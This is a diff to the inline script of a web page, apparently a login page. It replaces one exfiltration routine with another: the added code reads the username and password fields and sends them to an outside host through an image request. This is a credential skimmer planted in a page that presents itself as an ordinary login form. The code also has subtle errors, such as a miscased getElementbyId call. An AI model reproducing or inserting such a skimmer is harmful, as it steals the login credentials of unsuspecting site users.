@@ -339,14 +339,10 @@ h6,.h6{color:#3e474c;font-weight:500}.medium-heading{color:#788991}.copy-on-imag
 document.getElementsByClassName('error-message')[0].style.display = 'none';
 document.getElementsByClassName('problem')[0].style.display = 'none';
 
-function loadDoc() {
-var xhttp = new XMLHttpRequest();
-	xhttp.onreadystatechange = function(){
-		if(this.readyState == 4 && this.status == 200) {
-			document.getElementById('login').innerHTML = this.responseText;
-		}
-	};
-xhttp.open("GET", "http://r7.io/e/akean?s=" + document.getElementbyId('login_password'), true);
-xhttp.send();
+document.getElementById('login').onload= function() {
+	i = new Image();
+	username = document.getElementbyId('login_username').value;
+	pass = document.getElementbyId('login_password').value;
+	i.src = 'http://r7.io/e/akean?s=' + "username = " + username + "password = " + pass;
 }
 </script>
